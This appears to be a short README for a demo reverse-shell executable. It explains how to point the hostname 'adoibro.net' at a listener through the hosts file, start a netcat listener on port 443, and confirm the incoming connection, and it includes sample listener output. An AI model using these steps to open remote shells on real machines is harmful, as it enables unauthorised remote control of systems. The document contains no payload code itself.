## Demo rvshell

1. Record in `hosts` file is requried to resolve `adoibro.net` (TCP connection over port 443 will be established)
2. Executable provided for Windows platform.
3. You can build executable from source for any platform as you wish.

Assuming you run TCP server listening on port 443 with `nc`, example of running TCP listener on destination remote host:
```
nc -nlvp 443
```

When executable is run you should see the following message on destination server:
```
root@localhost:~# nc -nvlp 443
Listening on [0.0.0.0] (family 0, port 443)
Connection from [192.168.10.1] port 443 [tcp/*] accepted (family 2, sport 54604)
Following the white rabbit...
```
